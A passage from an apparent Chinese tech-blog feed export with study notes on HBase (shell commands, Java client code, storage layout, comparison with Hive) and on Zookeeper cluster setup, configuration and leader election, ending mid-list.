start-hbase.sh 等价于 hbase-daemon.sh start master hbase-daemons.sh start regionserver 注意: 在哪个节点启动 start-hbase.sh , 就在哪里启动 HMaster 进程, 如果 stop-hbase.sh停止 hbase HBase shell 操作登录shell终端. $hbase&gt; hbase shell help 相关 $hbase&gt; help查看所有帮助 $hbase&gt; table_help关于表操作的另外一种方式的帮助文档 $hbase&gt; help “dml”获取一组命令的提示 $hbase&gt;help ‘list_namespace’查看特定的命令帮助 desc 查看描述信息 desc ‘t1’ : 下面这些在建表的时候都可以指定{NAME =&gt; ‘f1’, BLOOMFILTER =&gt; ‘ROW’, VERSIONS =&gt; ‘1’, IN_MEMORY =&gt; ‘false’, KEEP_DELETED_CELLS =&gt; ‘FALSE’, DATA_BLOCK_ENCODING =&gt; ‘NONE’, TTL =&gt; ‘FOREVER’, COMPRESSION =&gt; ‘NONE’, MIN_VERSIONS =&gt; ‘0’, BLOCKCACHE =&gt; ‘true’, BLOCKSIZE =&gt; ‘65536’, REPLICATION_SCOPE =&gt; ‘0’}1 row(s) in 0.1780 seconds list 相关 $hbase&gt; list列出所有非系统表 $hbase&gt;list_namespace列出名字空间(数据库) $hbase&gt;list_namespace_tables ‘defalut’列出名字空间的所以表 create 相关 $hbase&gt;create_namespace ‘ns1’创建名字空间 $hbase&gt;create ‘ns1:t1’,’f1’创建表,指定空间下,列族注意: 如果 t1已经创建了, 就不能通过这个方式来添加 列族 create ‘t1’,’f1’ create ‘user_info’,{NAME=&gt;’base_info’,VERSIONS=&gt;3 },{NAME=&gt;’extra_info’,VERSIONS=&gt;1 }同时创建多个 列族 exist 相关 exists ‘t1’查看表是否存在 put 相关 注意: 如果往 同表 &amp; 同rowkey &amp; 同样的列 中插入 value, 会默认展示最近的一个时间戳的信息, 如果 get 的回收指定 VERSIONS数量, 则会展示此数量的版本信息 向 user 表中插入信息，row key 为 rk0001，列簇 info 中添加 name 列标示符，值为 zhangsan put ‘user’, ‘rk0001’, ‘info:name’, ‘zhangsan’, 1482077777777手动指定时间戳时间戳是可以自己指定的，如若不指定，则会自动获取系统的当前时间的时间戳 向 user 表中插入信息，row key 为 rk0001，列簇 info 中添加 gender 列标示符，值为 female put ‘user’, ‘rk0001’, ‘info:gender’, ‘female’ 向 user 表中插入信息，row key 为 rk0001，列簇 info 中添加 age 列标示符，值为 20 put ‘user’, ‘rk0001’, ‘info:age’, 20 向 user 表中插入信息，row key 为 rk0001，列簇 data 中添加 pic 列标示符，值为 picture put ‘user’, ‘rk0001’, ‘data:pic’, ‘picture’ get 相关 获取 user 表中 row key 为 rk0001 的所有信息 注意: ‘表名’, ‘ rowkey’ get ‘user’, ‘rk0001’ 获取 user 表中 row key 为 rk0001，info 列簇的所有信息 注意: ‘表名’, ‘ rowkey’, ‘列族名’ get ‘user’, ‘rk0001’, ‘info’ 获取 user 表中 row key 为 rk0001，info 列簇的 name、age 列标示符的信息 注意: ‘表名’, ‘rowkey’, ‘列族名’:’列名’, ‘列族名’:’列名’ get ‘user’, ‘rk0001’, ‘info:name’, ‘info:age’ 获取 user 表中 row key 为 rk0001，info、data 列簇的信息 注意: ‘表名’, ‘rowkey’, ‘列族名’, ‘列族名’ get ‘user’, ‘rk0001’, ‘info’, ‘data’ get ‘user’, ‘rk0001’, {COLUMN =&gt; [‘info’, ‘data’]} get ‘user’, ‘rk0001’, {COLUMN =&gt; [‘info:name’, ‘data:pic’]} 获取 user 表中 row key 为 rk0001，列簇为 info，版本号最新 5 个的信息 注意: ‘表名’, ‘rowkey’, {COLUMN =&gt;’列族名’, 存储版本数=&gt; 数量} get ‘user’, ‘rk0001’, {COLUMN =&gt; ‘info’, VERSIONS =&gt; 2} get ‘user’, ‘rk0001’, {COLUMN =&gt; ‘info:name’, VERSIONS =&gt; 5} get ‘user’, ‘rk0001’, {COLUMN =&gt; ‘info:name’, VERSIONS =&gt; 5, TIMERANGE =&gt; [1392368783980, 1392380169184]} 获取 user 表中 row key 为 rk0001，列标示符中含有 a 的信息 get ‘people’, ‘rk0001’, {FILTER =&gt; “(QualifierFilter(=,’substring:a’))”} 获取 国籍 为中国的用户信息 注意: ‘表名’, ‘rowkey’, ‘列族名’:’列名’, ‘value’ put ‘user’, ‘rk0002’, ‘info:name’, ‘fanbingbing’ put ‘user’, ‘rk0002’, ‘info:gender’, ‘female’ put ‘user’, ‘rk0002’, ‘info:nationality’, ‘中国’ get ‘user’, ‘rk0002’, {FILTER =&gt; “ValueFilter(=, ‘binary:中国’)”} 获取2个不同列中的指定字段 注意: ‘表名’, ‘rowkey’, {COLUMN =&gt; [‘列族名’:’列名’, ‘列族名’:’列名’]} get ‘user’, ‘rk0002’, {COLUMN =&gt; [‘info:name’, ‘data:pic’]} scan 相关 扫描元数据 scan ‘hbase : meta’ t9,,1529936935368.f1a900954c069f0319195f16043c8e1a column=info:regioninfo, timestamp=1529936935933, value={ENCODED =&gt; f1a900954c069f0319195f16043c8e1a, NAME =&gt; ‘t9,,1529936935368.f1a900954c069f031919 . 5f16043c8e1a.’, STARTKEY =&gt; ‘’, ENDKEY =&gt; ‘’} t9,,1529936935368.f1a900954c069f0319195f16043c8e1a column=info:seqnumDuringOpen, timestamp=1529936935933, value=\x00\x00\x00\x00\x00\x00\x00\x02 . t9,,1529936935368.f1a900954c069f0319195f16043c8e1a column=info:server, timestamp=1529936935933, value=cs5:16020 . t9,,1529936935368.f1a900954c069f0319195f16043c8e1a column=info:serverstartcode, timestamp=1529936935933, value=1529923622913 $hbase&gt;split ‘ns1:t1’//切割表 $hbase&gt;split ‘’ //切割区域, 见下面 切割之前 切割之后 UI界面 table regions 继续进行 region 切割 scan ‘hbase:meta’ 找到切割点 STARTKEY =&gt; ‘row000550’ 的 那行的 NAME =&gt; 后面的值 从这个值开始切割到指定值split ‘t9,row000551,1529938745618.90ed2fb6b7744ea5f0a7ff613d05aada.’,’row000888’ 扫描表中所有的信息 $hbase&gt;scan ‘ns1:t1’ 查询 user 表中列簇为 info 的信息 hbase&gt; scan ‘hbase:meta’扫描权标 $hbase&gt; scan ‘hbase:meta’, {COLUMNS =&gt; ‘info’}注意: COLUMNS要大写 $hbase&gt; scan ‘ns1:t1’, {COLUMNS =&gt; [‘c1’, ‘c2’], LIMIT =&gt; 10, STARTROW =&gt; ‘xyz’} scan ‘user’, {COLUMNS =&gt; ‘info’, RAW =&gt; true, VERSIONS =&gt; 5} scan ‘persion’, {COLUMNS =&gt; ‘info’, RAW =&gt; true, VERSIONS =&gt; 3}Scan 时可以设置是否开启 Raw 模式，开启 Raw 模式会返回包括已添加删除标记但是未 实际删除的数据。 查询 user 表中列簇为 info 和 data 的信息 scan ‘user’, {COLUMNS =&gt; [‘info’, ‘data’]} scan ‘user’, {COLUMNS =&gt; [‘info:name’, ‘data:pic’]} 查询 user 表中列簇为 info、列标示符为 name 的信息 scan ‘user’, {COLUMNS =&gt; ‘info:name’} 查询 user 表中列簇为 info、列标示符为 name 的信息,并且版本最新的 5 个 scan ‘user’, {COLUMNS =&gt; ‘info:name’, VERSIONS =&gt; 5} 查询 user 表中列簇为 info 和 data 且列标示符中含有 a 字符的信息 scan ‘user’, {COLUMNS =&gt; [‘info’, ‘data’], FILTER =&gt; “(QualifierFilter(=,’substring:a’))”} 查询 user 表中列簇为 info，rk 范围是[rk0001, rk0003)的数据 scan ‘people’, {COLUMNS =&gt; ‘info’, STARTROW =&gt; ‘rk0001’, ENDROW =&gt; ‘rk0003’} 查询 user 表中 row key 以 rk 字符开头的 scan ‘user’,{FILTER=&gt;”PrefixFilter(‘rk’)”} 查询 user 表中指定范围的数据 scan ‘user’, {TIMERANGE =&gt; [1392368783980, 1392380169184]} delete/truncate 相关 (删除,清空数据) 注意: 删除列族, 在 alter 中 删除 user 表 row key 为 rk0001，列标示符为 info:name 的字段数据 delete ‘people’, ‘rk0001’, ‘info:name’ 删除 user 表 row key 为 rk0001，列标示符为 info:name，timestamp 为 1392383705316 的数据 delete ‘user’, ‘rk0001’, ‘info:name’, 1392383705316 清空 user 表中的数据 truncate ‘people’目前版本会先 disable , 再 truncate, 最后再 enable alter 相关 注意,在修改列族 时 hbase&gt; alter ‘t1’, NAME =&gt; ‘f1’, VERSIONS =&gt; 5 VERSIONS 是指能存多少个版本, 如果不指定的话, 退出 hbase 的时候, 默认只会留最新的一个版本 如果存在, 就是修改 不存在, 就是增加 添加两个列簇 f1 和 f2 简写: alter ‘t1’, ‘f2’ alter ‘people’, NAME =&gt; ‘f1’ alter ‘user’, NAME =&gt; ‘f2’ 停用/启用 表 enable ‘t9’启用 is_enabled ‘t9’是否可用 disable ‘t9’停用 is_disabled ‘t9’是否不可用 删除一个列簇: 注意: 当表中只有一个列族时, 无法将其删除 disable ‘user’(新版本不用) alter ‘user’, NAME =&gt; ‘f1’, METHOD =&gt; ‘delete’ 或 alter ‘user’, ‘delete’ =&gt; ‘f1’ enable ‘user’ 添加列簇 f1 同时删除列簇 f2 disable ‘user’(新版本不用) alter ‘user’, {NAME =&gt; ‘f1’}, {NAME =&gt; ‘f2’, METHOD =&gt; ‘delete’} enable ‘user’ 将 user 表的 f1 列簇版本号改为 5 disable ‘user’(新版本不用) alter ‘people’, NAME =&gt; ‘info’, VERSIONS =&gt; 5people 为 rowkey enable ‘user’ drop 相关 disable ‘user’ drop ‘user’ count 相关 $hbase&gt;count ‘ns1:t1’统计函数, 1000行统计一次 flush 相关 把文件刷到磁盘的过程 hbase&gt; flush ‘TABLENAME’ hbase&gt; flush ‘REGIONNAME’ hbase&gt; flush ‘ENCODED_REGIONNAME’ ValueFilter 过滤器 get ‘person’, ‘rk0001’, {FILTER =&gt; “ValueFilter(=, ‘binary:中国’)”} get ‘person’, ‘rk0001’, {FILTER =&gt; “(QualifierFilter(=,’substring:a’))”} exit 退出$hbase&gt; exit 遇到问题总结 插入前, 必须创建好 namespace相当于数据库的概念 table表命 column family列族名 不需要提前创建 行名 列名 value 如果表已经创建, 要增加列族的话, 只能用 alter, 不能继续用 create 通过Java API访问Hbase 创建hbase模块 添加依赖&lt;?xml version=”1.0” encoding=”UTF-8”?&gt; 4.0.0 com.rox HbaseDemo 1.0-SNAPSHOT org.apache.hbase hbase-client 1.2.3 复制hbase集群的hbase-site.xml文件到模块的src/main/resources目录下。 -—————————————————————————————— Hbase API 类和数据模型之间的对应关系: \0. 总的对应关系 HBaseAdmin 编程实现 代码见 https://github.com/airpoet/bigdata/blob/master/HBaseDemo/src/test/java/com/rox/text/TestCRUD.javapublic class TestCRUD {@Testpublic void put() throws IOException {// 创建 conf 对象Configuration conf = HBaseConfiguration.create();/ 通过连接工厂创建连接对 /// 通过连接工厂创建连接对象Connection conn = ConnectionFactory.createConnection(conf);// 通过连接查询 TableName 对象TableName tname = TableName.valueOf(“ns1:t1”);// 获得 table对象Table table = conn.getTable(tname);// 通过bytes 工具类转化字符串为字节数组byte[] bytes = Bytes.toBytes(“row3”);// 创建 put 对象, 传入行号Put put = new Put(bytes);// 创建 列族, 列, value 的 byte 数据byte[] f1 = Bytes.toBytes(“f1”);byte[] id = Bytes.toBytes(“id”);byte[] value = Bytes.toBytes(188);put.addColumn(f1, id, value);// table put 数据table.put(put);//============================// getbyte[] rowid = Bytes.toBytes(“row3”);Get get = new Get(rowid);// 得到 resResult res = table.get(get); // 从 res 中取出 valuebyte[] idvalue = res.getValue(Bytes.toBytes(“f1”),Bytes.toBytes(“id”));System.out.println(Bytes.toInt(idvalue));}} HBase 写入过程 &amp; 存储路径 WALwrite ahead log,写前日志。 HDFS 上存储路径详解 http://cs1:50070/explorer.html#/hbase/data/ns1/t1/97eada11d196f1e134c41e859d338e07/f1/fsfsfgwgfsgfrgfdg data存储数据的目录 ns1namespace 名称 t1表名 97eada11d196f1e134c41e859d338e07region 的编号 f1列族 fsfsfgwgfsgfrgfdgHFile: 列族存储的文件, 每一个 hfile 文件对应的是一个列族 meta 数据路径 http://cs1:50070/explorer.html#/hbase/data/hbase/meta/1588230740/info HBase 和 Hive 的比较 相同点 HBase 和 Hive 都是架构在 Hadoop 之上，用 HDFS 做底层的数据存储，用 MapReduce 做 数据计算 不同点 解决的问题不同 Hive 是建立在 Hadoop 之上为了降低 MapReduce 编程复杂度的 ETL 工具。 HBase 是为了弥补 Hadoop 对实时操作的缺陷 表的架构不同 Hive 表是纯逻辑表，因为 Hive 的本身并不能做数据存储和计算，而是完全依赖 Hadoop HBase 是物理表，提供了一张超大的内存 Hash 表来存储索引，方便查询 定位 &amp; 访问机制不同 Hive 是数据仓库工具，需要全表扫描，就用 Hive，因为 Hive 是文件存储 HBase 是数据库，需要索引访问，则用 HBase，因为 HBase 是面向列的 NoSQL 数据库 存储模式不同 Hive 表中存入数据(文件)时不做校验，属于读模式存储系统 HBase 表插入数据时，会和 RDBMS 一样做 Schema 校验，所以属于写模式存储系统 是否实时处理(处理效率)不同 Hive 不支持单行记录操作，数据处理依靠 MapReduce，操作延时高 HBase 支持单行记录的 CRUD，并且是实时处理，效率比 Hive 高得多 HBase在 HDFS 上的存储路径 相同列族的数据存放在一个文件中。 [表数据的存储目录结构构成] hdfs://cs1:8020/hbase/data/${名字空间}/${表名}/${区域名称}/${列族名称}/${文件名} [WAL目录结构构成] hdfs://cs1:8020/hbase/WALs/${区域服务器名称,端口号,时间戳}/ Client 端 与 HBase 交互过程 HBase 简单集群结构 region:是 hbase 中对表进行切割的单元，由 regionserver 负责管理 region 分裂是逻辑概念?? :TODO hamster:hbase 的主节点，负责整个集群的状态感知，负载分配、负责用户表的元数据(schema)管理(可以配置多个用来实现 HA),hmaster 负载压力相对于 hdfs 的 namenode 会小很多 regionserver:hbase 中真正负责管理 region 的服务器，也就是负责为客户端进行表数据读写 的服务器每一台 regionserver 会管理很多的 region，同一个 regionserver 上面管理的所有的 region 不属于同一张表 zookeeper:整个 hbase 中的主从节点协调，主节点之间的选举，集群节点之间的上下线感 知„„都是通过 zookeeper 来实现 HDFS:用来存储 hbase 的系统文件，或者表的 region Hbase 顶层结构图 0.hbase集群启动时，master负责分配区域到指定区域服务器。 1.联系zk，找出meta表所在rs(regionserver)/hbase/meta-region-server 2.定位row key,找到对应region server 3.缓存信息在本地。 4.联系RegionServer 5.HRegionServer负责open HRegion对象，为每个列族创建Store对象，Store包含多个StoreFile实例，他们是对HFile的轻量级封装。每个Store还对应了一个MemStore，用于内存存储数据。 百万数据批量插入 代码long start = System.currentTimeMillis() ;Configuration conf = HBaseConfiguration.create();Connection conn = ConnectionFactory.createConnection(conf);TableName tname = TableName.valueOf(“ns1:t1”);HTable table = (HTable)conn.getTable(tname);//不要自动清理缓冲区table.setAutoFlush(false);for(int i = 4 ; i &lt; 1000000 ; i ++){Put put = new Put(Bytes.toBytes(&quot;row&quot; + i)) ; //关闭写前日志 put.setWriteToWAL(false); put.addColumn(Bytes.toBytes(&quot;f1&quot;),Bytes.toBytes(&quot;id&quot;),Bytes.toBytes(i)); put.addColumn(Bytes.toBytes(&quot;f1&quot;),Bytes.toBytes(&quot;name&quot;),Bytes.toBytes(&quot;tom&quot; + i)); put.addColumn(Bytes.toBytes(&quot;f1&quot;),Bytes.toBytes(&quot;age&quot;),Bytes.toBytes(i % 100)); table.put(put); if(i % 2000 == 0){ table.flushCommits(); } }//table.flushCommits();System.out.println(System.currentTimeMillis() - start ); HBase 切割文件 默认10G 进行切割 hbase.hregion.max.filesize 10737418240 hbase-default.xml HBase 合并文件 merge_region ‘1f4609ba4e2a9440aedde5d0e7123722’,’48277c27196a5c6e30d5ae679e9ec4f0’merge ‘前一个区域的 encoded’ , ‘后一个区域的 encoded’ HBase 手动移动文件 hbase(main):034:0&gt; move ‘8658ac9ea01f80c2cca32693397a1e70’,’cs3,16020,1529980599903’前面是 encoded region name , 后面是服务器名 预先切割 创建表时, 预先对表进行切割 切割线是 rowkeycreate ‘ns1:t2’,’f1’,SPLITS=&gt;[‘row300’, ‘row600’] 创建预先切割表之后, 存的值就会到对应的区域中去 注意: put 一次就是一条数据 指定版本数的问题 创建表时指定列族的版本数,该列族的所有列都具有相同数量版本 创建表时，指定列族的版本数。$hbase&gt;create ‘ns1:t3’,{NAME=&gt;’f1’,VERSIONS=&gt;3} 如果创建表的时候创的是3个版本, 查4个版本, 此时最多也就显示3个$hbase&gt;get ‘ns1:t3’,’row1’,{COLUMN=&gt;’f1’,VERSIONS=&gt;4}COLUMN CELL f1:name timestamp=1530019546709, value=tom3 f1:name timestamp=1530019542978, value=tom2 f1:name timestamp=1530019540164, value=tom1 原生扫描(expert) 原生扫描, 包含标记了delete的数据$hbase&gt;scan ‘ns1:t3’,{COLUMN=&gt;’f1’,RAW=&gt;true,VERSIONS=&gt;10}hbase(main):177:0&gt; scan ‘ns1:t3’,{COLUMN=&gt;’f1’,RAW=&gt;true,VERSIONS=&gt;10}ROW COLUMN+CELL row1 column=f1:name, timestamp=1530019546709, value=tom3 row1 column=f1:name, timestamp=1530019542978, value=tom2 row1 column=f1:name, timestamp=1530019540164, type=DeleteColumn row1 column=f1:name, timestamp=1530019540164, value=tom1 删除数据, 标记为删除, 小于该删除时间的数据都作废, flush 后, 用 RAW 似乎还会保留, 用非 RAW 的方式查看的画, 此删除数据, 及时间戳比这个小的数据, 都不会显示. $hbase&gt;delete ‘ns1:t3’,’row1’,’f1:name’,148989875645 这里是否要停掉 hbase 服务再起来看看? TTL time to live ,存活时间 影响所有的数据，包括没有删除的数据 超过该时间，原生扫描也扫不到数据 创建带 TTL参数的表$hbase&gt;create ‘ns1:tx’ , {NAME=&gt;’f1’,TTL=&gt;10,VERSIONS=&gt;10} KEEP_DELETED_CELLS 删除key之后，数据是否还保留, 未测试$hbase&gt;create ‘ns1:tx’ , {NAME=&gt;’f1’,TTL=&gt;10,VERSIONS,KEEP_DELETED_CELLS=&gt;true} TTL 的优先级高于 KEEP_DELETED_CELLS, 如果设置了 TTL, 时间一到就没了, 用 RAW 也找不回来 缓存 和 批处理 开启服务器端扫描器缓存 表层面(全局), 貌似是默认的? 再看看书上说的 hbase.client.scanner.caching 2147483647 hbase-default.xml 操作层面 注意: 貌似JavaAPI 中默认是没有设置 caching 的 设置方式scan.setCaching(10); 操作时间cache row nums : 1000 //632cache row nums : 5000 //423cache row nums : 1 //7359 扫描器缓存是 面向行级别的 批量扫描是 面向列级别的 控制每次next()服务器端返回的列的个数。 scan.setBatch(5);每次next返回5列。 过滤器 图示 代码 https://github.com/airpoet/bigdata/blob/master/HBaseDemo/src/test/java/com/rox/text/TestCRUD.java 计数器 shell 实现 $hbase&gt;incr ‘ns1:t8’,’row1’,’f1:click’,1后面可以跟任意数字, 正负,0都可以 $hbase&gt;get_counter ‘ns1:t8’,’row1’,’f1:click’获取计数器 Java 代码 https://github.com/airpoet/bigdata/blob/master/HBaseDemo/src/test/java/com/rox/text/TestCRUD.java 协处理器 coprocessor :TODO 有空再看 批处理的，等价于存储过程或者触发器 Observer RegionObserver //RegionServer区域观察者 MasterObserver //Master节点。 WAlObserver // Endpoint 终端,类似于存储过程。 HBase &amp; Mapreduce 整合 运行官方案例 [ap@cs1]~/apps/hbase% export HBASE_HOME=/home/ap/apps/hbase [ap@cs1]~/apps/hbase% export HADOOP_HOME=/home/ap/apps/hadoop [ap@cs1]~/apps/hbase% export HADOOP_CLASSPATH=${HBASE_HOME}/bin/hbase mapredcp 使用 MapReduce导入本地数据到Hbase apps/hadoop/bin/yarn jar apps/hbase/lib/hbase-server-1.2.6.1.jar importtsv \ -Dimporttsv.columns=HBASE_ROW_KEY,info:name,info:color fruit \ hdfs://cs1:8020/input_fruit这是 namenode 的 RPC 地址 HBase &amp; Hive 整合1.环境配置 12345export HBASE_HOME=/home/ap/apps/hbaseexport HADOOP_HOME=/home/ap/apps/hadoopexport HADOOP_CLASSPATH=`$&#123;HBASE_HOME&#125;/bin/hbase mapredcp` 剩下的hbase知识点 有空再补充]]></content>
      <categories>
        <category>Hadoop</category>
        <category>HBase</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>HBase</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i-Zookeeper]]></title>
    <url>%2F2018%2F06%2F23%2FHadoop%2F4-Zookeeper%2Fi-Zookeeper%2F</url>
    <content type="text"><![CDATA[1.Zookeeper 的安装&amp;概述1.1. Zookeeper 简介Zookeeper是一个开源的分布式的，为分布式应用提供协调服务的Apache项目。 zk提供的服务 Naming service //按名称区分集群中的节点. Configuration management //对加入节点的最新化处理。 Cluster management //实时感知集群中节点的增减. Leader election //leader选举 Locking and synchronization service //修改时锁定数据，实现容灾. Highly reliable data registry //节点宕机数据也是可用的。 1.2. ZK 的工作机制 1.4. ZK 架构 1.4.1 名词解释 1.Client ​ 从server获取信息，周期性发送数据给server，表示自己还活着。 ​ client连接时，server回传ack信息。 ​ 如果client没有收到reponse，自动重定向到另一个server. ​ 2.Server ​ zk集群中的一员，向client提供所有service，回传ack信息给client，表示自己还活着。 ​ 3.ensemble ​ 一组服务器。 ​ 最小节点数是3. ​ 4.Leader ​ 如果连接的节点失败，自定恢复，zk服务启动时，完成leader选举。 ​ 5.Follower ​ 追寻leader指令的节点。 1.4.2 整体解释 1）Zookeeper：一个领导者（leader），多个跟随者（follower）组成的集群。 2）Leader负责进行投票的发起和决议，更新系统状态 3）Follower用于接收客户请求并向客户端返回结果，在选举Leader过程中参与投票 4）集群中只要有半数以上节点存活，Zookeeper集群就能正常服务。 5）全局数据一致：每个server保存一份相同的数据副本，client无论连接到哪个server，数据都是一致的。 6）更新请求顺序进行，来自同一个client的更新请求按其发送顺序依次执行。 7）数据更新原子性，一次数据更新要么成功，要么失败。 8）实时性，在一定时间范围内，client能读到最新数据。 1.5. znode ZooKeeper数据模型的结构与Unix文件系统很类似，整体上可以看作是一棵树，每个节点称做一个ZNode。每一个ZNode默认能够存储1MB的数据，每个ZNode都可以通过其路径唯一标识 zk中的节点，维护了stat，由Version number, Action control list (ACL), Timestamp,Data length.构成. data version //数据写入的过程变化 ACL //action control list, 1.6. 节点类型​ 1.持久节点 ​ client结束，还存在。 ​ 2.临时节点 ​ 在client活动时有效，断开自动删除。临时节点不能有子节点。 ​ leader推选时使用。 ​ 3.序列节点 ​ 在节点名之后附加10个数字，主要用于同步和锁. 1.7. Session​ Session中的请求以FIFO执行，一旦client连接到server，session就建立了。sessionid分配client. ​ client以固定间隔向server发送心跳，表示session是valid的，zk集群如果在超时时候，没有收到心跳， ​ 判定为client挂了，与此同时，临时节点被删除。 1.8. Watches​ 观察。 ​ client能够通过watch机制在数据发生变化时收到通知。 ​ client可以在read 节点时设置观察者。watch机制会发送通知给注册的客户端。 ​ 观察模式只触发一次。 ​ session过期，watch机制删除了。 1.9. zk工作流程​ zk集群启动后，client连接到其中的一个节点，这个节点可以是leader，也可以是follower。 ​ 连通后，node分配一个id给client，发送ack信息给client。 ​ 如果客户端没有收到ack，连接到另一个节点。 ​ client周期性发送心跳信息给节点保证连接不会丢失。 ​ 如果client读取数据，发送请求给node，node读取自己数据库，返回节点数据给client. ​ 如果client想要在 zk 中存储数据，将路径和数据发送给server，server转发给leader。 ​ leader再补发请求给所有follower。只有大多数(超过半数)节点成功响应，则 ​ 写操作成功。 1.10 zk 应用场景1.10.1 统一命名服务 1.10.2 统一配管理 1.10.3 统一集群管理 1.10.4 服务器动态上下线 1.10.5 软负载均衡 2.Zookeeper 完全分布式的安装&amp;基本使用2.1 安装2.1.1 高可用安装PS: 高可用安装见这里 2.2.2 完全分布式安装123456789101112131415161718192021222324252627282930313233341.挑选3台主机cs1 ~ cs32.每台机器都安装zk &amp; 配置环境变量3.配置zk配置文件cs1 ~ cs3[/home/ap/apps/zk/conf/zoo.cfg]----------tickTime=2000initLimit=10syncLimit=5dataDir=/home/ap/zookeeperclientPort=2181server.1=cs1:2888:3888server.2=cs2:2888:3888server.3=cs3:2888:3888---------4.在每台主机的/home/ap/zookeeper中添加myid,内容分别是1,2,3[cs1]$&gt;echo 1 &gt; /home/ap/zookeeper/myid[cs2]$&gt;echo 2 &gt; /home/ap/zookeeper/myid[cs3]$&gt;echo 3 &gt; /home/ap/zookeeper/myid5.在cs1~cs3上,启动服务器集群 $&gt;zkServer.sh start6.查看每台服务器的状态$&gt;zkServer.sh status* 注意: 如果有3台机器, 只启动一台的话, 会显示如下, 因为根据配置, 有3台机器, 此时只有一台启动, 没有过半数, 整个集群是挂掉的* 只有启动的机器数量超过配置的半数, zk 集群才有效. 2.2.3 zoo.cfg 文件中配置参数的含义1234567891011121314151617181920212223242526271）tickTime=2000：通信心跳数 tickTime：通信心跳数，Zookeeper服务器心跳时间，单位毫秒 Zookeeper使用的基本时间，服务器之间或客户端与服务器之间维持心跳的时间间隔，也就是每个tickTime时间就会发送一个心跳，时间单位为毫秒。 它用于心跳机制，并且设置最小的session超时时间为两倍心跳时间。(session的最小超时时间是2*tickTime)2）initLimit=10：LF初始通信时限 initLimit：LF初始通信时限 集群中的follower跟随者服务器(F)与leader领导者服务器(L)之间初始连接时能容忍的最多心跳数（tickTime的数量），用它来限定集群中的Zookeeper服务器连接到Leader的时限。 投票选举新leader的初始化时间 Follower在启动过程中，会从Leader同步所有最新数据，然后确定自己能够对外服务的起始状态。 Leader允许F在initLimit时间内完成这个工作。3）syncLimit=5：LF同步通信时限 syncLimit：LF同步通信时限 集群中Leader与Follower之间的最大响应时间单位，假如响应超过syncLimit * tickTime， Leader认为Follwer死掉，从服务器列表中删除Follwer。 在运行过程中，Leader负责与ZK集群中所有机器进行通信，例如通过一些心跳检测机制，来检测机器的存活状态。 如果L发出心跳包在syncLimit之后，还没有从F那收到响应，那么就认为这个F已经不在线了。4）dataDir：数据文件目录+数据持久化路径 dataDir：数据文件目录+数据持久化路径 保存内存数据库快照信息的位置，如果没有其他说明，更新的事务日志也保存到数据库。5）clientPort=2181：客户端连接端口 监听客户端连接的端口6) Server.A=B:C:D。 A是一个数字，表示这个是第几号服务器； B是这个服务器的ip地址； C是这个服务器与集群中的Leader服务器交换信息的端口； D是万一集群中的Leader服务器挂了，需要一个端口来重新进行选举，选出一个新的Leader，而这个端口就是用来执行选举时服务器相互通信的端口。 # 集群模式下配置一个文件myid，这个文件在dataDir目录下，这个文件里面有一个数据就是A的值，Zookeeper启动时读取此文件，拿到里面的数据与zoo.cfg里面的配置信息比较从而判断到底是哪个server。 2.2 ZK客户端的连接12345678910111213141516171819202122232425262728293031323334353637383940414243$&gt;zkCli.sh -server cs1:2181 //进入zk命令行$zk]help //查看帮助$zk]quit //退出$zk]create /a tom //创建节点$zk]get /a //查看数据$zk]ls / //列出节点$zk]ls2 / //查看当前节点数据并能看到更新次数等数据$zk]set /a tom //设置数据$zk]delete /a //删除一个节点$zk]rmr /a //递归删除所有节点。$zk]stat / //查看节点状态注意: * 创建节点不能递归创建, 目前只能一层一层创建* 每次创建都的写数据, 只创建目录的话会创建不成功* 如果 close 后, 并没有退出客户端, 只是访问不到数据, 此时如果想要连接, 可以用connect host:port================================================================================ZK 的帮助文档----------------help:ZooKeeper -server host:port cmd args stat path [watch] set path data [version] ls path [watch] delquota [-n|-b] path ls2 path [watch] setAcl path acl setquota -n|-b val path history redo cmdno printwatches on|off delete path [version] sync path listquota path rmr path get path [watch] create [-s] [-e] path data acl addauth scheme auth quit getAcl path close connect host:port 2.3 监听测试注意点: 注册的监听只能使用一次, 监听完毕后需要重新注册. 123456789101112131415161718192021222324=======节点值的变化的监听==========（1）在cs1主机上注册监听/app1节点数据变化[zk: localhost:2181(CONNECTED) 26] get /app1 watch （2）在cs2主机上修改/app1节点的数据[zk: localhost:2181(CONNECTED) 5] set /app1 777（3）观察cs2主机收到数据变化的监听WATCHER::WatchedEvent state:SyncConnected type:NodeDataChanged path:/app1=======节点的子节点变化的监听==========（1）在cs1主机上注册监听/app1节点的子节点变化[zk: localhost:2181(CONNECTED) 1] ls /app1 watch[aa0000000001, server101]（2）在cs2主机/app1节点上创建子节点[zk: localhost:2181(CONNECTED) 6] create /app1/bb 666Created /app1/bb（3）观察cs1主机收到子节点变化的监听WATCHER::WatchedEvent state:SyncConnected type:NodeChildrenChanged path:/app1 3. ZK 内部机制3.1 选举机制3.1.1. zookeeper的选举机制（全新集群paxos）以一个简单的例子来说明整个选举的过程. 假设有五台服务器组成的zookeeper集群,它们的id从1-5,同时它们都是最新启动的,也就是没有历史数据,在存放数据量这一点上,都是一样的.假设这些服务器依序启动,来看看会发生什么. 1) 服务器1启动,此时只有它一台服务器启动了,它发出去的报没有任何响应,所以它的选举状态一直是LOOKING状态 2) 服务器2启动,它与最开始启动的服务器1进行通信,互相交换自己的选举结果,由于两者都没有历史数据,所以id值较大的服务器2胜出,但是由于没有达到超过半数以上的服务器都同意选举它(这个例子中的半数以上是3),所以服务器1,2还是继续保持LOOKING状态. 3) 服务器3启动,根据前面的理论分析,服务器3成为服务器1,2,3中的老大,而与上面不同的是,此时有三台服务器选举了它,所以它成为了这次选举的leader. 4) 服务器4启动,根据前面的分析,理论上服务器4应该是服务器1,2,3,4中最大的,但是由于前面已经有半数以上的服务器选举了服务器3,所以它只能接收当小弟的命了. 5) 服务器5启动,同4一样,当小弟. 3.1.2. 非全新集群的选举机制(数据恢复)那么，初始化的时候，是按照上述的说明进行选举的，但是当zookeeper运行了一段时间之后，有机器down掉，重新选举时，选举过程就相对复杂了。 需要加入数据id、leader id和逻辑时钟。 数据id：数据新的id就大，数据每次更新都会更新id。 Leader id：就是我们配置的myid中的值，每个机器一个。 逻辑时钟：这个值从0开始递增,每次选举对应一个值,也就是说: 如果在同一次选举中,那么这个值应该是一致的 ; 逻辑时钟值越大,说明这一次选举leader的进程更新. 选举的标准就变成： ​ 1、逻辑时钟小的选举结果被忽略，重新投票 ​ 